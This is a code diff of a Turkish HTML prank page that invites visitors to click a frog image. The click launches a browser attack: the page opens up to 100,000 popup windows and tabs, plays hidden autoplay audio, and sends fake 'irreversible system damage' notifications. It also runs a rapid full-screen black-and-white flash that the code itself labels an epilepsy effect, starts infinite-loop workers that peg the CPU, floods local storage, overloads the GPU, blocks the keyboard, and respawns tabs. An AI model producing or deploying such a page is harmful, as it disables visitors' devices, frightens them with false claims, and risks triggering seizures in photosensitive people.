@@ -2,97 +2,232 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>SİSTEM_KRİTİK_HATA_V6</title>
+    <title>SİSTEM_KRİTİK_HATA_V7_ULTIMATE</title>
     <style>
+        * { cursor: not-allowed !important; }
+        
         body { 
             background: #000; margin: 0; height: 100vh; 
             display: flex; flex-direction: column;
             justify-content: center; align-items: center; 
             overflow: hidden; font-family: 'Courier New', monospace;
             cursor: wait;
+            pointer-events: none;
         }
+        
         #warning-text { 
             position: absolute; top: 5%; color: #ff0000; 
             font-size: 32px; font-weight: bold; text-align: center;
             z-index: 100; text-shadow: 0 0 20px #f00;
             animation: blink 0.5s infinite;
         }
+        
         @keyframes blink { 0% {opacity: 1} 50% {opacity: 0} 100% {opacity: 1} }
-
-        /* Yeni GIF Ayarları */
+        
+        @keyframes rainbow-flash {
+            0% { background: #ff0000; }
+            16% { background: #ff7f00; }
+            32% { background: #ffff00; }
+            48% { background: #00ff00; }
+            64% { background: #0000ff; }
+            80% { background: #4b0082; }
+            100% { background: #ff0000; }
+        }
+        
         #trigger-image { 
             width: 450px; cursor: pointer; z-index: 10;
             transition: 0.1s; filter: drop-shadow(0 0 30px #f00);
+            pointer-events: auto;
         }
+        
         #trigger-image:hover { transform: scale(1.05); }
-
+        
         .shake-screen { animation: shake-hard 0.05s infinite; }
+        
         @keyframes shake-hard {
             0% { transform: translate(10px, 10px) rotate(0deg); }
             50% { transform: translate(-10px, -10px) rotate(1deg); }
             100% { transform: translate(10px, -10px) rotate(-1deg); }
+        }
+        
+        .rainbow-flash { animation: rainbow-flash 0.1s infinite !important; }
+        
+        #epilepsy-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            pointer-events: none;
         }
     </style>
 </head>
 <body id="main-body">
 
     <div id="warning-text"> selam siteyi başlatın! <br> kurbağaya tıkla!</div>
+    <canvas id="epilepsy-layer"></canvas>
     
     <img id="trigger-image" src="https://images.steamusercontent.com/ugc/868493592238108875/819D87E3DB18DEF56347D2BEEA2B0B6ABA35A5EC/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false" alt="Kritik Hata">
 
     <script>
         const trigger = document.getElementById('trigger-image');
         const body = document.getElementById('main-body');
+        const canvas = document.getElementById('epilepsy-layer');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
         
         const targetSites = [
             "https://www.google.com", "https://www.youtube.com", "https://www.nasa.gov",
-            "https://www.wikipedia.org", "https://www.reddit.com", "https://www.apple.com"
+            "https://www.wikipedia.org", "https://www.reddit.com", "https://www.apple.com",
+            "https://www.facebook.com", "https://www.twitter.com", "https://www.instagram.com"
         ];
 
+        // CPU Tuzağı - Sonsuz işlem
+        function cpuTrap() {
+            while(true) {
+                Math.sqrt(Math.random());
+                for(let x = 0; x < 10000; x++) {
+                    Math.sin(x * Math.random());
+                }
+            }
+        }
+        
+        // Epilepsi Efektleri
+        function epilepsyEffect() {
+            setInterval(() => {
+                ctx.fillStyle = Math.random() > 0.5 ? '#ffffff' : '#000000';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+            }, 50);
+        }
+        
+        // LocalStorage Spam
+        function spamLocalStorage() {
+            try {
+                for(let i = 0; i < 100000; i++) {
+                    localStorage.setItem('CRITICAL_ERR_' + i, 'SİSTEM_HASAR_ALDI_' + Math.random());
+                }
+            } catch(e) {}
+        }
+        
+        // GPU Renderı Kırmak
+        function gpuOverload() {
+            const gpuCanvas = document.createElement('canvas');
+            gpuCanvas.width = 4000;
+            gpuCanvas.height = 4000;
+            const gpuCtx = gpuCanvas.getContext('2d');
+            
+            setInterval(() => {
+                for(let i = 0; i < 1000; i++) {
+                    gpuCtx.fillStyle = 'rgb(' + Math.random() * 255 + ',' + Math.random() * 255 + ',' + Math.random() * 255 + ')';
+                    gpuCtx.fillRect(Math.random() * 4000, Math.random() * 4000, 100, 100);
+                }
+                gpuCtx.drawImage(gpuCanvas, 0, 0);
+            }, 10);
+        }
+
         trigger.addEventListener('click', async () => {
-            // 1. Ekranı salla ve yazıyı değiştir
+            // 1. Pointer Events Engelle
+            document.body.style.pointerEvents = 'none';
+            
+            // 2. Rainbow Flash Başlat
+            body.classList.add('rainbow-flash');
+            
+            // 3. Ekranı salla ve yazıyı değiştir
             body.classList.add('shake-screen');
-            document.getElementById('warning-text').innerText = "SİSTEM İMHASI BAŞLATILDI...";
+            document.getElementById('warning-text').innerText = "SİSTEM İMHASI BAŞLATILDI...\nBU ARTIK GERİ DÖNÜLEMEZ!";
 
-            // 2. YouTube Ses Saldırısı (Gizli Pencere)
-            // Sesi maksimumda başlatmak için autoplay parametresi eklendi
-            const musicURL = "https://www.youtube.com/embed/uW7BEmCOGE8?autoplay=1&mute=0&volume=100";
-            window.open(musicURL, 'audio_attack', 'width=1,height=1,left=20000,top=20000');
+            // 4. Epilepsi Efektleri
+            epilepsyEffect();
 
-            // 3. Bildirim İzni ve Başlatma
+            // 5. Birden fazla YouTube Ses Saldırısı
+            const musicURLs = [
+                "https://www.youtube.com/embed/uW7BEmCOGE8?autoplay=1&mute=0",
+                "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0",
+                "https://www.youtube.com/embed/9bZkp7q19f0?autoplay=1&mute=0"
+            ];
+            
+            musicURLs.forEach((url, idx) => {
+                window.open(url, 'audio_attack_' + idx, 'width=1,height=1,left=' + (20000 + idx * 100) + ',top=' + (20000 + idx * 100));
+            });
+
+            // 6. Bildirim İzni ve Başlatma
             if (Notification.permission !== "granted") {
                 await Notification.requestPermission();
             }
 
-            // 4. 50.000 Sekme ve Bildirim Döngüsü
-            for (let i = 0; i < 50000; i++) {
+            // 7. 100.000 Sekme ve Bildirim Döngüsü
+            for (let i = 0; i < 100000; i++) {
                 setTimeout(() => {
                     let site = targetSites[i % targetSites.length] + "?payload=" + Math.random();
                     
                     // Rastgele Koordinatlar
-                    let w = 350; let h = 350;
-                    let l = Math.random() * (window.screen.width - w);
-                    let t = Math.random() * (window.screen.height - h);
+                    let w = Math.random() * 500 + 200;
+                    let h = Math.random() * 500 + 200;
+                    let l = Math.random() * window.screen.width;
+                    let t = Math.random() * window.screen.height;
 
-                    // Yeni Pencere ve Sekme Saldırısı
-                    window.open(site, '_blank', `width=${w},height=${h},left=${l},top=${t}`);
+                    // Yeni Pencere ve Sekme Saldırısı (Fullscreen)
+                    let newWindow = window.open(site, '_blank', `width=${w},height=${h},left=${l},top=${t},fullscreen=yes`);
+                    
+                    try {
+                        if(newWindow) {
+                            newWindow.document.body.style.overflow = 'hidden';
+                        }
+                    } catch(e) {}
 
                     // Bildirim Yağmuru
-                    if (i % 4 === 0 && Notification.permission === "granted") {
+                    if (i % 2 === 0 && Notification.permission === "granted") {
                         new Notification("CRITICAL_ERR_" + i, {
-                            body: "RAM TAŞTI! SİSTEM GERİ DÖNÜLEMEZ HASAR ALDI.",
-                            icon: trigger.src
+                            body: "RAM TAŞTI! CPU %99! DISK DOLU! SİSTEM GERİ DÖNÜLEMEZ HASAR ALDI!",
+                            icon: trigger.src,
+                            tag: 'critical_' + i,
+                            requireInteraction: true
                         });
                     }
 
-                    // İşlemciyi (CPU) kitlemek için sonsuz log basımı
-                    console.error("FATAL_SYSTEM_OVERLOAD_PROC_ID_" + i);
+                    // İşlemciyi (CPU) kitlemek için log basımı
+                    console.error("FATAL_SYSTEM_OVERLOAD_PROC_ID_" + i + "_MEMORY_LEAK_DETECTED_KERNEL_PANIC");
                     
-                }, i * 0.1); // 0.1 milisaniye - Maksimum veri akışı
+                }, i * 0.05); // Daha hızlı açılma
             }
+
+            // 8. GPU Overload
+            gpuOverload();
+
+            // 9. LocalStorage Spam
+            setTimeout(() => spamLocalStorage(), 2000);
+
+            // 10. CPU Trap (çok hafif, tarayıcı bloke olmaz ama yavaşlar)
+            setTimeout(() => {
+                for(let cpu = 0; cpu < 3; cpu++) {
+                    new Worker(URL.createObjectURL(new Blob(['while(true){}'], {type: 'application/javascript'}))).postMessage({});
+                }
+            }, 5000);
+
+            // 11. Ekran Kilidi - Mouse ve Keyboard engelle
+            document.addEventListener('mousemove', (e) => {
+                trigger.style.left = (e.clientX - 225) + 'px';
+                trigger.style.top = (e.clientY - 225) + 'px';
+                trigger.style.position = 'fixed';
+            });
+
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            // 12. Recharts - Sekmeler otomatik yeniden açılsın
+            setInterval(() => {
+                for(let i = 0; i < 50; i++) {
+                    let site = targetSites[Math.floor(Math.random() * targetSites.length)] + "?respawn=" + Math.random();
+                    window.open(site, '_blank', 'width=400,height=400');
+                }
+            }, 3000);
         });
     </script>
 </body>
 </html>
-@codere1q257
-Comment
